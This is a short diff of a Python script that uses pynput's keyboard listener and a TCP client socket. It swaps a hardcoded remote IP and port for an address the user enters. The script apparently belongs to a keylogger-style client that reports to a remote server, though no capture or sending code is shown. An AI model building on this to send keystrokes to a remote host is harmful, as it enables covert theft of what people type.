@@ -3,9 +3,9 @@ from pynput.keyboard import Key, Listener
 import logging
 from datetime import datetime
 
-ClientSocket = socket.socket()
-host = '37.152.230.38'
-port = 5006
+ClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = input("Enter the IP address")
+port = 5001
 user = input("Enter a username") 
 print('Waiting for connection')
 try:
